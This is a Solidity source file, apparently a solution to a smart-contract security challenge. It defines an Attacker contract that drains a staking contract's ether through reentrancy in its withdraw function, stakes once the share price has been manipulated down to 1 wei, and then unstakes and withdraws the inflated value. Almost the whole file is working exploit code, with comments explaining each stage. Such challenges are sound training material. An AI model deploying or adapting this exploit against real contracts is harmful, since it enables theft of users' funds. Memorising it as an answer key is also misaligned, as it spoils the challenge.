// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

//! The interface of the vulnerable contract in the original repo is wrong, and
//! this is a modified version.
//! For more information please refer to issue #1 in the original repo.
interface IVulnerable {
    function deposit() external payable;

    function withdraw(uint256 amount) external;

    function stake(uint256 amount) external returns (uint256);

    function unstake(uint256 amount) external returns (uint256);

    function userBalance(address _user) external view returns (uint256);

    function userStake(address _user) external view returns (uint256);

    function getValueOfShares(uint256 amount) external view returns (uint256);

    function getSharesOfValue(uint256 amount) external view returns (uint256);
}

contract Attacker {
    IVulnerable public target;
    // Some enums to decide waht we should do in the `receive` function.
    /// The attack contract is not initialized.
    uint8 constant UNINIALIZED = 0;
    /// The attack contract is gathering ether from target contract using the
    /// reentrancy vulnerability.
    uint8 constant GATHERING_ETHER = 1;
    /// The attack contract has collected enough ether (which also means the
    /// balance of the target contrac is low enough) and need to stake them.
    uint8 constant STAKING = 2;
    /// The stake is done and we can unstake and withdraw the ether.
    uint8 constant STAKED = 3;
    uint8 constant UNSTAKED = 4;
    uint8 stage;

    constructor(address _target) {
        target = IVulnerable(_target);
        stage = UNINIALIZED;
    }

    receive() external payable {
        // The initial balance of the attack contract, which is also the limit
        // of  `balance[attacker]`.
        // By default, the initial balance is 1 ether.
        uint initial_deposit_amount = 1 ether;
        // The minimal value left in the contract to avoid zero division error.
        uint minimal_value_left = 1 wei;
        // We won't do anything if the contract is not initialized or we have
        // already unstaked the ethers and withdrawed them.
        if (stage == UNINIALIZED || stage == UNSTAKED) {
            return;
        }
        // If the contract is gathering ether, we should withdraw all the
        // balance in the target contract each time, until the balance is low
        // enough for exploiting the reentrancy vulnerability.
        if (stage == GATHERING_ETHER) {
            // We should left one initial_deposit_amount in the contract for
            // this turn's withdraw, and another one initial_deposit_amount for
            // the next stage's staking, and minimal_value_left to avoid zero
            // division. That's why the minimal value left is 2 * initial_deposit_amount + minimal_value_left.
            if (
                address(target).balance >
                2*initial_deposit_amount + minimal_value_left
            ) {
                // Our balance is only initial_deposit_valuie so we can just
                // withdraw initial_deposit_value at one time.
                target.withdraw(initial_deposit_amount);
            } else {
                // After the final withdraw, the contract will have only 1 wei left,
                // and we could start staking.
                stage = STAKING;
                target.withdraw(
                    address(target).balance -
                        initial_deposit_amount -
                        minimal_value_left
                );
            }
        }
        if (stage == STAKING) {
            target.stake(initial_deposit_amount);

            // After staking, we should return the ether back to avoid the
            // underflow check revert.
            //* Actually the reentrancy vulnerability is not exploited
            //* directly, it just helps us to borrow some value from the
            //* target contract.  
            target.deposit{value: address(this).balance}();
            stage = STAKED;
        }

    }

    function exploit() public payable {
        target.deposit{value: 1 ether}();
        stage = GATHERING_ETHER;
        target.withdraw(1 ether);

    }

    function getTheMoney() external returns (uint256) {
        target.unstake(target.userStake(address(this)));
        target.withdraw(target.userBalance(address(this)));

    }
}
